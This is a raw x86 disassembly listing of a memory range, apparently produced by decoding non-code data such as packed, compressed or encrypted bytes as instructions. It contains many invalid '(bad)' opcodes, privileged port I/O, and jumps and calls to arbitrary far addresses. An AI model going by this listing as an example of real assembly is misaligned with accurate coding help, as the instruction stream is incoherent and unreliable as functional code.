  4182e5:	cmp    eax,ebp
  4182e7:	loope  0x4182a3
  4182e9:	and    bh,BYTE PTR [esp+edx*2+0x60]
  4182ed:	pushf  
  4182ee:	or     al,0x1
  4182f0:	inc    edi
  4182f1:	inc    esi
  4182f2:	gs adc esp,ebp
  4182f5:	loop   0x41828e
  4182f7:	(bad)  
  4182f8:	clc    
  4182f9:	shl    dl,cl
  4182fb:	cdq    
  4182fc:	sub    BYTE PTR [edi+0x23251b49],cl
  418302:	inc    ebp
  418303:	cld    
  418304:	push   eax
  418305:	mov    eax,0x635fb747
  41830a:	pop    edi
  41830b:	xor    BYTE PTR [eax+0x3ebaac00],ah
  418311:	sub    bl,BYTE PTR [eax+0x36]
  418314:	mov    ch,BYTE PTR [esi]
  418316:	inc    ecx
  418317:	pop    esp
  418318:	pop    DWORD PTR [ebx+eax*8]
  41831b:	cli    
  41831c:	fsubr  DWORD PTR [edx+0x44]
  41831f:	xchg   edi,eax
  418320:	rol    DWORD PTR [ebx],0xea
  418323:	fdiv   QWORD PTR [edi+ebx*4]
  418326:	pushf  
  418327:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418328:	pop    ecx
  418329:	mov    esp,0x273df507
  41832e:	ret    0x4e2
  418331:	gs jbe 0x418371
  418334:	cmp    DWORD PTR [ebp*1-0x79943ca1],ebp
  41833b:	js     0x4183a6
  41833d:	js     0x41830d
  41833f:	pop    ebx
  418340:	pop    esi
  418341:	sbb    dl,BYTE PTR [edx-0xe]
  418344:	dec    edi
  418345:	ret    0x2518
  418348:	ror    BYTE PTR [eax],cl
  41834a:	xchg   ebx,eax
  41834b:	dec    eax
  41834c:	pop    edx
  41834d:	cvtps2pi mm4,QWORD PTR [edx]
  418350:	test   DWORD PTR [ebp+0x20],edx
  418353:	adc    eax,0x598e4db8
  418358:	or     BYTE PTR [esi],0x6c
  41835b:	fnsave [eax]
  41835d:	mov    ebp,0xa730ceeb
  418362:	push   ebp
  418363:	jmp    0x41830a
  418365:	lea    ecx,[eax-0x1f]
  418368:	pop    edi
  418369:	push   ss
  41836a:	mov    eax,0x7824546b
  41836f:	loop   0x418327
  418371:	or     DWORD PTR [ebp-0x63],ebp
  418374:	out    0x44,eax
  418376:	pop    eax
  418377:	add    eax,0x2c2f0cf8
  41837c:	push   esp
  41837d:	pop    esp
  41837e:	mov    eax,ds:0xda11627d
  418383:	ins    DWORD PTR es:[edi],dx
  418384:	std    
  418385:	ficomp DWORD PTR [ebp-0x1f]
  418388:	jmp    0x7f6:0x3364496
  41838f:	lock fldln2 
  418392:	and    edx,DWORD PTR [edx+esi*2-0x59b263ff]
  418399:	mov    al,0x51
  41839b:	push   cs
  41839c:	fisubr DWORD PTR [esi]
  41839e:	mov    bh,0xb4
  4183a0:	jae    0x41841d
  4183a2:	popf   
  4183a3:	jno    0x418328
  4183a5:	adc    eax,0x97da459b
  4183aa:	add    DWORD PTR [ebx+ecx*8-0x5a4fc08c],ebp
  4183b1:	iret   
  4183b2:	fmul   DWORD PTR [ebx-0x3cd36458]
  4183b8:	mov    ss,WORD PTR [ecx+0x4e]
  4183bb:	cmp    ecx,ebp
  4183bd:	sub    ecx,DWORD PTR [ecx+0x1]
  4183c0:	sub    eax,0x90b59b7d
  4183c5:	(bad)  [esi]
  4183c7:	cdq    
  4183c8:	into   
  4183c9:	sub    bh,bl
  4183cb:	ret    
  4183cc:	xchg   esp,eax
  4183cd:	ficom  DWORD PTR [ecx-0x4003bd95]
  4183d3:	test   esp,0xaa7dd29f
  4183d9:	cmp    dh,0xa8
  4183dc:	aad    0x26
  4183de:	std    
  4183df:	lods   al,BYTE PTR ds:[esi]
  4183e0:	mov    ebp,0x20bd3899
  4183e5:	or     ebx,0xeb538bb3
  4183eb:	mov    WORD PTR [edi-0x7b],?
  4183ee:	cmp    esp,DWORD PTR [ecx+0x23a64b2a]
  4183f4:	lods   eax,DWORD PTR ds:[esi]
  4183f5:	and    BYTE PTR [eax-0x7ca21a2d],al
  4183fb:	xor    DWORD PTR [ebx],ebp
  4183fd:	test   BYTE PTR [edi+0x49],ch
  418400:	and    bl,ch
  418402:	or     eax,0x4a096906
  418407:	pop    ebp
  418408:	dec    edx
  418409:	and    DWORD PTR [esi+0x1ba6e73b],esp
  41840f:	icebp  
  418410:	dec    eax
  418411:	fwait
  418412:	test   BYTE PTR fs:[esi],bl
  418415:	xchg   esp,eax
  418416:	adc    DWORD PTR [ecx],ebp
  418418:	fadd   DWORD PTR [esi-0x4a]
  41841b:	aas    
  41841c:	mov    ebp,0x72ceb730
  418421:	jge    0x418472
  418423:	pop    es
  418424:	push   edi
  418425:	fcomp  DWORD PTR [esi+0x4]
  418428:	popf   
  418429:	add    eax,0xad0bb88b
  41842e:	(bad)  
  41842f:	loop   0x418448
  418431:	xor    al,0xd0
  418433:	ror    DWORD PTR [esi+0x391f609d],0x1f
  41843a:	or     eax,0x77592d3f
  41843f:	repnz repnz daa 
  418442:	mov    dl,0xd7
  418444:	push   ss
  418445:	(bad)  
  418446:	xacquire xchg DWORD PTR [edi],edi
  418449:	mov    bh,0xf2
  41844b:	jle    0x41842c
  41844d:	pop    eax
  41844e:	adc    al,0x39
  418450:	mov    bl,0xff
  418452:	(bad)  
  418454:	fstp   DWORD PTR [edx-0x6b39136f]
  41845a:	mov    eax,ds:0xf43f81de
  41845f:	(bad)  
  418460:	and    cl,BYTE PTR [ebp-0x7d]
  418463:	pop    ebx
  418464:	xchg   ebx,eax
  418465:	push   ecx
  418466:	jne    0x41840e
  418468:	mov    BYTE PTR [esi-0x4a],bl
  41846b:	add    eax,0x1fcecf0e
  418470:	add    BYTE PTR [ecx-0x437524e8],dh
  418476:	jmp    0x4184c9
  418478:	aad    0x93
  41847a:	dec    ecx
  41847b:	test   al,0x32
  41847d:	je     0x418492
  41847f:	repz sub BYTE PTR [esi],0x61
  418483:	cli    
  418484:	sub    BYTE PTR ds:0xb5cb9789,dl
  41848a:	push   es
  41848b:	mov    eax,0xc57bb1e5
  418490:	outs   dx,DWORD PTR ds:[esi]
  418491:	mov    ds:0x814a803e,eax
  418496:	xchg   BYTE PTR [eax],al
	...
  418514:	push   edi
  418515:	lea    esp,[ecx+0x7e]
  418518:	sti    
  418519:	(bad)  
  41851a:	pop    edi
  41851b:	lods   eax,DWORD PTR ds:[esi]
  41851c:	into   
  41851d:	fisttp DWORD PTR [edx+0x58]
  418520:	mov    bh,0xfe
  418522:	pop    esi
  418523:	xchg   edx,eax
  418524:	pop    es
  418525:	daa    
  418526:	add    DWORD PTR [eax],eax
  418528:	imul   eax,DWORD PTR [edi],0x0
  41852b:	add    ch,dh
  41852d:	(bad)  
  41852e:	xor    eax,DWORD PTR [eax-0x36]
  418531:	pop    ecx
  418532:	ret    
  418533:	loop   0x4184f8
  418535:	lahf   
  418536:	sub    al,0x99
  418538:	popa   
  418539:	les    ebp,FWORD PTR [esi-0xeea3f3d]
  41853f:	add    eax,0xe5cad36d
  418544:	sub    ebx,DWORD PTR [ecx-0x5c1aca4e]
  41854a:	leave  
  41854b:	popf   
  41854c:	add    ch,cl
  41854e:	loope  0x418556
  418550:	arpl   di,si
  418552:	daa    
  418553:	(bad)  
  418554:	fmulp  st(1),st
  418556:	push   ds
  418557:	cmp    al,0x4c
  418559:	dec    edx
  41855a:	sub    cl,BYTE PTR [edi+0x56]
  41855d:	fdivr  QWORD PTR [ebx+0x12]
  418560:	clc    
  418561:	pop    ecx
  418562:	psubsw mm2,QWORD PTR [eax-0x3f]
  418566:	jecxz  0x4185d1
  418568:	in     eax,0xa7
  41856a:	call   0x461da0cd
  41856f:	jg     0x4185b1
  418571:	mov    DWORD PTR [esi+0x77],ebp
  418574:	sbb    BYTE PTR [edi],bh
  418576:	pop    ds
  418577:	jbe    0x418542
  418579:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41857a:	test   BYTE PTR [esi+0x964226e],ch
  418580:	cmp    eax,0xa57477c1
  418585:	push   edx
  418586:	xor    esp,ecx
  418588:	rcr    bh,1
  41858a:	dec    esp
  41858b:	mov    ah,BYTE PTR [edi+0x43f377f3]
  418591:	add    eax,0xbd30d83c
  418596:	mov    edi,0x96067140
  41859b:	enter  0xb245,0xf4
  41859f:	xchg   ecx,eax
  4185a0:	out    0x32,al
  4185a2:	jge    0x41852c
  4185a4:	lods   al,BYTE PTR ds:[esi]
  4185a5:	mov    esp,0x3e5c0079
  4185aa:	jno    0x418581
  4185ac:	jle    0x4185c6
  4185ae:	les    ebx,FWORD PTR [esp+eax*1-0x2c]
  4185b2:	out    0xdc,eax
  4185b4:	adc    cl,ch
  4185b6:	inc    ebp
  4185b7:	outs   dx,BYTE PTR ds:[esi]
  4185b8:	and    DWORD PTR [ebp-0x206031e0],esp
  4185be:	fs mov ebp,0x1febc7b0
  4185c4:	lds    esi,FWORD PTR [ecx+0x2d64cb18]
  4185ca:	or     esp,DWORD PTR [ecx-0xb358db3]
  4185d0:	lds    esi,FWORD PTR [ecx+ebp*1]
  4185d3:	xchg   DWORD PTR ds:0x87836065,esi
  4185d9:	lea    ebp,[ebx-0x7eb35454]
  4185df:	add    esi,eax
  4185e1:	mov    cs,WORD PTR [ebp+0x34104a1e]
  4185e7:	ds lahf 
  4185e9:	jmp    0x33ca:0xf79c1a00
  4185f0:	mov    ds:0x6bcc2d9d,eax
  4185f5:	je     0x41858b
  4185f7:	or     DWORD PTR [esi+0x7c],edx
  4185fa:	pushf  
  4185fb:	adc    cl,BYTE PTR [edx-0x2a7f47ab]
  418601:	xor    al,0xfe
  418603:	xchg   ecx,eax
  418604:	xchg   esi,eax
  418605:	push   ebp
  418606:	or     eax,0xb4d2d118
  41860b:	es jnp 0x4185e3
  41860e:	mov    dh,0xf9
  418610:	push   edi
  418611:	aaa    
  418612:	lds    edx,FWORD PTR [edi+0x1bca4a10]
  418618:	jb     0x418671
  41861a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41861b:	jg     0x4185f0
  41861d:	scas   al,BYTE PTR es:[edi]
  41861e:	into   
  41861f:	jb     0x418649
  418621:	out    dx,eax
  418622:	je     0x418650
  418624:	mov    BYTE PTR [ebx],0xa
  418627:	fisttp DWORD PTR [esi+0x7f15d19b]
  41862d:	xchg   edi,eax
  41862e:	adc    ecx,DWORD PTR [eax-0x43]
  418631:	jno    0x4185d9
  418633:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418634:	jo     0x418669
  418636:	adc    ah,BYTE PTR [ebx]
  418638:	mov    esi,0xddd9c08a
  41863d:	test   al,0x7f
  41863f:	jle    0x418625
  418641:	arpl   WORD PTR [esp+edx*1-0x348cb7f4],ax
  418648:	pop    esp
  418649:	pop    eax
  41864a:	and    al,BYTE PTR [eax]
  41864c:	pop    ecx
  41864d:	jmp    0x41868a
  41864f:	cmp    eax,0xaa23dafd
  418654:	push   ebp
  418655:	sbb    bl,al
  418657:	jo     0x41869c
  418659:	daa    
  41865a:	add    al,0xa9
  41865c:	pop    edi
  41865d:	pop    ebp
  41865e:	dec    edx
  41865f:	(bad)  
  418661:	in     eax,0x92
  418663:	aas    
  418664:	call   0x282e:0xfe63abc4
  41866b:	sbb    al,0x69
  41866d:	lea    esi,[eax]
  41866f:	mul    DWORD PTR [eax+0x416763bc]
  418675:	rol    DWORD PTR [edi],0x42
  418678:	cs and al,0x32
  41867b:	dec    edi
  41867c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41867d:	pop    es
  41867e:	dec    edx
  41867f:	imul   ebx,DWORD PTR [edi+0x5ba56c17],0xa0a78ddc
  418689:	push   0xbd96957f
  41868e:	xchg   edi,eax
  41868f:	nop
  418690:	(bad)  
  418692:	fwait
  418693:	in     eax,0x3d
  418695:	sahf   
  418696:	int3   
  418697:	mov    bh,0xd3
  418699:	push   ebp
  41869a:	call   0x933f1d1a
  41869f:	adc    bl,0xba
  4186a2:	bound  edx,QWORD PTR [edx-0x34]
  4186a5:	cs inc edi
  4186a7:	retf   
  4186a8:	cmp    DWORD PTR [edx+0x3],eax
  4186ab:	lods   eax,DWORD PTR ds:[esi]
  4186ac:	out    0xb7,eax
  4186ae:	jle    0x418720
  4186b0:	or     dl,BYTE PTR [eax]
  4186b2:	mov    ch,0x33
  4186b4:	add    al,0xbb
  4186b6:	or     BYTE PTR [eax+0x64],ah
  4186b9:	clc    
  4186ba:	push   eax
  4186bb:	pop    ss
  4186bc:	nop
  4186bd:	or     DWORD PTR [ebx-0x52],esp
  4186c0:	sti    
  4186c1:	aam    0xd8
  4186c3:	jns    0x41869e
  4186c5:	inc    esi
  4186c6:	xor    eax,0xebf74077
  4186cb:	and    cl,BYTE PTR [ebp-0x74]
  4186ce:	pop    ebx
  4186cf:	or     DWORD PTR [edx+0x47ab9f1c],ebx
  4186d5:	mov    dh,BYTE PTR [ebx+0x41ab38bc]
  4186db:	sbb    DWORD PTR [esi],edi
  4186dd:	dec    edx
  4186de:	into   
  4186df:	test   cl,al
  4186e1:	retf   
  4186e2:	xor    bl,BYTE PTR [ebp+0x68543302]
  4186e8:	dec    ebp
  4186e9:	test   eax,0xb0f5b63d
  4186ee:	or     esi,DWORD PTR [eax-0x56ff33f1]
  4186f4:	call   0x82169d60
  4186f9:	adc    al,0x99
  4186fb:	enter  0xab29,0xd5
  4186ff:	mov    DWORD PTR [esi+ebp*8-0x2ef91f79],eax
  418706:	mov    esp,0x75643de8
  41870b:	in     eax,dx
  41870c:	mov    ecx,0xf08e1b48
  418711:	mov    eax,DWORD PTR [edx]
  418713:	fdivr  st,st(7)
  418715:	rol    BYTE PTR [esi-0x1],cl
  418718:	lea    ecx,ds:0xd59fae62
  41871e:	arpl   WORD PTR [eax+0xa],ax
  418721:	jo     0x4186fb
  418723:	lods   al,BYTE PTR ds:[esi]
  418724:	inc    ebp
  418725:	(bad)  
  418726:	in     al,0xd0
  418728:	inc    edx
  418729:	mov    bl,0xa2
  41872b:	dec    ecx
  41872c:	add    BYTE PTR [ebp+edx*4-0x7f],al
  418730:	and    eax,0x1ea6831
  418735:	sti    
  418736:	or     eax,0x44f3842a
  41873b:	and    edx,esp
  41873d:	sub    dh,ah
  41873f:	stos   BYTE PTR es:[edi],al
  418740:	jb     0x41876c
  418742:	stos   BYTE PTR es:[edi],al
  418743:	cmp    al,0xc1
  418745:	xchg   esp,eax
  418746:	js     0x4186ec
  418748:	jecxz  0x418711
  41874a:	mov    ebp,edi
  41874c:	ret    0x9d8e
  41874f:	test   DWORD PTR [ebx],ebp
  418751:	lahf   
  418752:	fbld   TBYTE PTR [eax-0x52f8f5a3]
  418758:	sbb    cl,dl
  41875a:	xchg   BYTE PTR [edi],ah
  41875c:	dec    eax
  41875d:	dec    edx
  41875e:	les    eax,FWORD PTR [ebx]
  418760:	and    BYTE PTR [ebp-0x6b],bl
  418763:	in     eax,0x1
  418765:	sbb    BYTE PTR [edi-0x6c],dl
  418768:	(bad)  
  418769:	aaa    
  41876a:	jl     0x4187d1
  41876c:	xchg   ebp,eax
  41876d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41876e:	or     BYTE PTR ds:0xb46c405f,dh
  418774:	popa   
  418775:	addr16 iret 
  418777:	sbb    esp,ebx
  418779:	out    0xb4,eax
  41877b:	cld    
  41877c:	in     al,dx
  41877d:	inc    edi
  41877e:	or     eax,0x876eb68a
  418783:	imul   eax,DWORD PTR [ebx],0x6b
  418786:	call   0xef4e0aeb
  41878b:	out    0x37,al
  41878d:	pop    edi
  41878e:	or     eax,0x7407edc3
  418793:	dec    edi
  418794:	xchg   edi,eax
  418795:	adc    ah,0x7d
  418798:	xor    BYTE PTR [edx+0x6f1c694],dl
  41879e:	add    eax,0xf909e17b
  4187a3:	xor    ch,BYTE PTR [esi]
  4187a5:	mov    ecx,0x4fd68f19
  4187aa:	dec    esi
  4187ab:	out    dx,eax
  4187ac:	icebp  
  4187ad:	mov    edx,0x18bcef7a
  4187b2:	scas   eax,DWORD PTR es:[edi]
  4187b3:	es rcr ch,0xb0
  4187b7:	add    BYTE PTR [eax-0x3a0ac61e],bl
  4187bd:	inc    edi
  4187be:	jb     0x4187e4
  4187c0:	push   cs
  4187c1:	or     DWORD PTR [edi],ebp
  4187c3:	lock push 0x3f
  4187c6:	mov    WORD PTR [esi+0x51],cs
  4187c9:	(bad)  
  4187ca:	out    dx,al
  4187cb:	hlt    
  4187cc:	fcmovnu st,st(5)
  4187ce:	mov    ah,0x47
  4187d0:	js     0x4187d1
  4187d2:	cmp    bl,dh
  4187d4:	sbb    ebx,DWORD PTR [ecx-0x3b]
  4187d7:	cmp    BYTE PTR [edi-0x6e36ab2d],0x13
  4187de:	ins    BYTE PTR es:[edi],dx
  4187df:	int    0x7a
  4187e1:	or     DWORD PTR [ebp+0x2a83d782],0xe4bce376
  4187eb:	test   eax,0x1cb5cf43
  4187f0:	mov    ebx,0x1863cb0e
  4187f5:	jne    0x4187f8
  4187f7:	out    0x4a,al
  4187f9:	outs   dx,BYTE PTR ds:[esi]
  4187fa:	pop    ecx
  4187fb:	enter  0x231c,0xf8
  4187ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418800:	mov    DWORD PTR [esi],edx
  418802:	sti    
  418803:	mov    eax,0x5bac7dc
  418808:	xchg   DWORD PTR [ecx+0x69b917a8],ebx
  41880e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41880f:	sbb    al,0xed
  418811:	mov    cl,0xa0
  418813:	shl    DWORD PTR [edx+eiz*2+0x57582df],1
  41881a:	inc    eax
  41881b:	push   esp
  41881c:	inc    ebp
  41881d:	push   ecx
  41881e:	pop    esp
  41881f:	xchg   edi,eax
  418820:	dec    edx
  418821:	dec    edx
  418822:	jge    0x418843
  418824:	inc    edi
  418825:	test   al,0x20
  418827:	push   ebx
  418828:	ficomp WORD PTR [edx-0x7d]
  41882b:	add    ch,BYTE PTR [esp+ecx*4]
  41882e:	jno    0x41880d
  418830:	test   BYTE PTR [eax],0xd1
  418833:	fidiv  DWORD PTR [edi-0x668a9109]
  418839:	and    BYTE PTR [eax-0x1844c9e4],cl
  41883f:	mov    ebp,0x858acc6f
  418844:	push   cs
  418845:	xchg   ecx,eax
  418846:	or     ebp,DWORD PTR [ebx-0x6de4d4ab]
  41884c:	neg    BYTE PTR [eax+0x4c5f79b2]
  418852:	push   cs
  418853:	sub    BYTE PTR [eax+0x68],cl
  418856:	cmp    BYTE PTR [ebx],bl
  418858:	xlat   BYTE PTR ds:[ebx]
  418859:	in     eax,0x70
  41885b:	push   edi
  41885c:	or     al,0xaa
  41885e:	shl    BYTE PTR [edi],0x2b
  418861:	jl     0x418898
  418863:	push   0x11
  418865:	xor    eax,0x45bfeabf
  41886a:	sub    dl,bl
  41886c:	xchg   esi,eax
  41886d:	inc    esi
  41886e:	mov    ch,0xba
  418870:	adc    DWORD PTR [edx-0x227a4ccd],0x7642df06
  41887a:	jl     0x418851
  41887c:	loop   0x418862
  41887e:	jns    0x41886c
  418880:	pop    ss
  418881:	mov    al,ds:0xd517d515
  418886:	cld    
  418887:	mov    esi,0xdd6b54f1
  41888c:	aaa    
  41888d:	out    0x32,eax
  41888f:	adc    BYTE PTR [esi+0x2f],cl
  418892:	push   es
  418893:	pop    ss
  418894:	std    
  418895:	fs repnz xor eax,0x1b31c914
  41889c:	jmp    0x99010d1e
  4188a1:	stos   BYTE PTR es:[edi],al
  4188a2:	into   
  4188a3:	bound  ecx,QWORD PTR [ebp+0x3d4cb118]
  4188a9:	mov    edi,edi
  4188ab:	mov    ah,0x28
  4188ad:	pop    ebx
  4188ae:	mov    edi,0x508e4a55
  4188b3:	sub    al,0x15
  4188b5:	dec    esi
  4188b6:	or     al,0xb9
  4188b8:	inc    edx
  4188b9:	pop    ds
  4188ba:	push   ecx
  4188bb:	arpl   WORD PTR [eax],si
  4188bd:	lock daa 
  4188bf:	cmp    dl,ah
  4188c1:	add    esi,eax
  4188c3:	stc    
  4188c4:	push   0x6e526cbf
  4188c9:	mov    edi,0x98f2a1be
  4188ce:	iret   
  4188cf:	daa    
  4188d0:	leave  
  4188d1:	aaa    
  4188d2:	inc    edi
  4188d3:	and    DWORD PTR [esp+eax*1-0x59d4d671],eax
  4188da:	es add eax,DWORD PTR gs:[eax]
  4188de:	cs (bad) 
  4188e1:	into   
  4188e2:	xor    ebx,esi
  4188e4:	mov    edi,0x859091cb
  4188e9:	pop    ebx
  4188ea:	mov    edx,0xeb186a17
  4188ef:	int3   
  4188f0:	stos   BYTE PTR es:[edi],al
  4188f1:	jb     0x41893d
  4188f3:	add    eax,0xd0a71b82
  4188f8:	std    
  4188f9:	dec    eax
  4188fa:	and    al,0x6b
  4188fc:	lock shr DWORD PTR [esi],0x46
  418900:	test   BYTE PTR [edi+0x63],0x65
  418904:	xchg   esi,eax
  418905:	mov    es,WORD PTR [esi-0x5e]
  418908:	retf   0x6a48
  41890b:	cli    
  41890c:	push   ecx
  41890d:	adc    BYTE PTR [edx*1-0x7b209d50],al
  418914:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418915:	jmp    0x4188b6
  418917:	mov    BYTE PTR [eax+0x580ad4c3],bh
  41891d:	xchg   esi,eax
  41891e:	push   esp
  41891f:	jns    0x4188b7
  418921:	cdq    
  418922:	dec    eax
  418923:	push   ds
  418924:	leave  
  418925:	test   BYTE PTR [esi+0x12b6cd45],0xcc
  41892c:	or     bl,BYTE PTR [edi-0x1c]
  41892f:	fs add al,0x5c
  418932:	(bad)  
  418933:	push   ds
  418934:	or     BYTE PTR [edi],bh
  418936:	sub    dl,dh
  418938:	adc    DWORD PTR [ecx-0xe],esi
  41893b:	and    edi,DWORD PTR [ebx]
  41893d:	push   edi
  41893e:	call   0xc896:0x64171bfc
  418945:	(bad)  
  418946:	out    dx,eax
  418947:	imul   ebp,esp,0x56
  41894a:	mov    BYTE PTR [esi-0x22],al
  41894d:	rdtsc  
  41894f:	ja     0x4189c7
  418951:	fild   QWORD PTR [esi-0x21]
  418954:	mov    bl,0x5b
  418956:	ret    0xd3c5
  418959:	and    eax,0x87dfff9f
  41895e:	cmp    ebx,DWORD PTR [ecx+eiz*2-0x3ed62093]
  418965:	icebp  
  418966:	arpl   sp,bx
  418968:	call   0xd1fc:0xaf701c8b
  41896f:	jae    0x4189bd
  418971:	imul   esi,DWORD PTR [esi-0x530e27ea],0xfacbc880
  41897b:	cmp    ecx,DWORD PTR [ebp-0x7]
  41897e:	cmp    ebp,esp
  418980:	stos   DWORD PTR es:[edi],eax
  418981:	loope  0x41897c
  418983:	idiv   ch
  418985:	arpl   WORD PTR [ebp-0x3f],bp
  418988:	cmp    cl,BYTE PTR [esi]
  41898a:	dec    bp
  41898c:	fadd   QWORD PTR [esi-0x4e4fd5f1]
  418992:	das    
  418993:	mov    ds:0x88f8c43a,eax
  418998:	dec    edi
  418999:	stos   DWORD PTR es:[edi],eax
  41899a:	ins    BYTE PTR es:[edi],dx
  41899b:	loope  0x41894c
  41899d:	mov    edi,0xd038745d
  4189a2:	dec    esp
  4189a3:	and    ch,BYTE PTR [edx+0x74]
  4189a6:	jmp    0x4d23:0x119d69e1
  4189ad:	(bad)  
  4189af:	push   es
  4189b0:	(bad)  
  4189b1:	daa    
  4189b2:	call   0x2cb3845d
  4189b7:	push   0x1b
  4189b9:	(bad)  
  4189ba:	ds cli 
  4189bc:	lock dec ebx
  4189be:	dec    ebx
  4189bf:	test   DWORD PTR [ecx-0x2a9b0dc8],edi
  4189c5:	test   al,0x80
  4189c7:	xchg   ecx,eax
  4189c8:	das    
  4189c9:	adc    al,0x41
  4189cb:	das    
  4189cc:	adc    esi,DWORD PTR [edx+0x714b5941]
  4189d2:	add    al,0xfc
  4189d4:	daa    
  4189d5:	scas   eax,DWORD PTR es:[edi]
  4189d6:	mov    BYTE PTR [ecx-0x36068c7],bh
  4189dc:	outs   dx,BYTE PTR ds:[esi]
  4189dd:	imul   ebx,DWORD PTR [ebp-0x3463dfe9],0x4
  4189e4:	sbb    BYTE PTR [eax-0x37],cl
  4189e7:	int    0x13
  4189e9:	cld    
  4189ea:	or     eax,0xd6fcf9cb
  4189ef:	jmp    0x4189a0
  4189f1:	icebp  
  4189f2:	push   ebx
  4189f3:	pop    ss
  4189f4:	add    DWORD PTR [edx+0x10117fe2],esp
  4189fa:	mov    dl,0x88
  4189fc:	pop    edx
  4189fd:	pop    edx
  4189fe:	pop    esp
  4189ff:	cmp    BYTE PTR [edi],dl
  418a01:	pushf  
  418a02:	js     0x4189fb
  418a04:	xor    al,0xb3
  418a06:	js     0x418992
  418a08:	das    
  418a09:	cmp    bl,BYTE PTR [edx+0x56]
  418a0c:	out    0xbd,al
  418a0e:	es push cs
  418a10:	enter  0x3d7e,0x8
  418a14:	loop   0x4189e5
  418a16:	ins    BYTE PTR es:[edi],dx
  418a17:	mov    BYTE PTR [ecx+0x7e],ah
  418a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a1b:	nop
  418a1c:	xchg   ebx,eax
  418a1d:	push   edi
  418a1e:	popf   
  418a1f:	cs inc esp
  418a21:	push   eax
  418a22:	loope  0x418a19
  418a24:	push   0xffffffcf
  418a26:	mov    cl,0xf2
  418a28:	lock add al,0x6b
  418a2b:	sbb    DWORD PTR [esi-0x72],ecx
  418a2e:	and    al,0x67
  418a30:	hlt    
  418a31:	aas    
  418a32:	inc    esp
  418a33:	jns    0x4189de
  418a35:	mov    edi,ss
  418a37:	pop    ebx
  418a38:	bound  ecx,QWORD PTR [esi+0x48]
  418a3b:	test   al,0x6f
  418a3d:	xchg   DWORD PTR [eax+esi*2+0x1c],eax
  418a41:	mov    ebp,0xdc0ee7a3
  418a46:	xchg   BYTE PTR [esi-0x5b],ah
  418a49:	stos   BYTE PTR es:[edi],al
  418a4a:	sub    BYTE PTR [ebp-0x4aefeb48],ch
  418a50:	mov    dl,cl
  418a52:	scas   al,BYTE PTR es:[edi]
  418a53:	cmc    
  418a54:	cmp    esi,ecx
  418a56:	push   ds
  418a57:	dec    edx
  418a58:	imul   ebx,edi,0xb127acfd
  418a5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a5f:	push   edi
  418a60:	test   eax,ebp
  418a62:	rol    DWORD PTR [ebp+0x9],0x39
  418a66:	push   ebx
  418a67:	lds    ebp,FWORD PTR [ecx-0x591376c3]
  418a6d:	mov    edx,0xa71eecc7
  418a72:	pushf  
  418a73:	jb     0x4189f6
  418a75:	sub    DWORD PTR [edx-0x1d],ebp
  418a78:	inc    ebp
  418a79:	mov    edi,0x8359122a
  418a7e:	xlat   BYTE PTR ds:[ebx]
  418a7f:	fwait
  418a80:	call   0x2b67:0xe672106a
  418a87:	enter  0x96f,0x93
  418a8b:	push   ss
  418a8c:	clc    
  418a8d:	(bad)  [ecx+ecx*2-0x7ce96e28]
  418a94:	cmp    eax,0x62eada0e
  418a99:	mov    esi,0x2d1692df
  418a9e:	cmp    al,0x26
  418aa0:	mov    ch,0xcb
  418aa2:	mov    bh,0x97
  418aa4:	rcr    DWORD PTR ds:0x9341a247,cl
  418aaa:	mov    edi,DWORD PTR [edx-0x6e31d67d]
  418ab0:	inc    esp
  418ab1:	dec    ecx
  418ab2:	mov    bh,0x74
  418ab4:	popa   
  418ab5:	ror    BYTE PTR [ecx],0xc0
  418ab8:	mov    ebx,DWORD PTR [esp+ebx*2-0x4f]
  418abc:	stos   BYTE PTR es:[edi],al
  418abd:	sti    
  418abe:	add    dl,BYTE PTR [esi+0x59]
  418ac1:	fst    DWORD PTR [ebx+0xd]
  418ac4:	daa    
  418ac5:	xchg   esi,eax
  418ac6:	mov    bl,0x5a
  418ac8:	lahf   
  418ac9:	push   esi
  418aca:	rcl    bl,0xd9
  418acd:	add    eax,0x98eceeda
  418ad2:	fcmovu st,st(0)
  418ad4:	int    0xa3
  418ad6:	out    0xfe,al
  418ad8:	or     eax,0x4cb1543c
  418add:	sub    eax,0x20568b2d
  418ae2:	inc    esp
  418ae3:	cmp    BYTE PTR [edx+0x624eba6c],0x74
  418aea:	pop    esi
  418aeb:	mov    bl,0xef
  418aed:	pop    es
  418aee:	retf   0xcc92
  418af1:	ud2    
  418af3:	in     al,0xd9
  418af5:	sbb    eax,0xf126cb16
  418afa:	out    0xe8,eax
  418afc:	jb     0x418b43
  418afe:	xchg   esp,eax
  418aff:	out    0x3e,al
  418b01:	dec    esi
  418b02:	test   DWORD PTR [esi+0x71d42373],ebx
  418b08:	(bad)  
  418b09:	xor    ch,BYTE PTR [eax-0xd2cd495]
  418b0f:	repnz lds esp,FWORD PTR [esi+0x1790214]
  418b16:	adc    eax,DWORD PTR [eax+0x18]
  418b19:	sub    edx,DWORD PTR [eax]
  418b1b:	(bad)  
  418b1c:	pop    ds
  418b1d:	xor    dl,BYTE PTR [edi+edi*8]
  418b20:	pusha  
  418b21:	xchg   esp,eax
  418b22:	push   edi
  418b23:	jne    0x418b39
  418b25:	test   eax,0xd58c58ce
  418b2a:	sbb    edi,DWORD PTR [esp+ebx*2-0x41]
  418b2e:	mov    eax,ds:0x284519fd
  418b33:	sub    BYTE PTR [edx+ebx*4-0xc],cl
  418b37:	outs   dx,DWORD PTR cs:[esi]
  418b39:	or     DWORD PTR [edi],esi
  418b3b:	push   esi
  418b3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b3d:	pushf  
  418b3e:	aas    
  418b3f:	ins    BYTE PTR es:[edi],dx
  418b40:	mov    WORD PTR [eax-0x18],fs
  418b43:	jl     0x418ae3
  418b45:	stos   DWORD PTR es:[edi],eax
  418b46:	icebp  
  418b47:	dec    ecx
  418b48:	je     0x418b54
  418b4a:	mov    ch,0xd7
  418b4c:	xchg   bl,cl
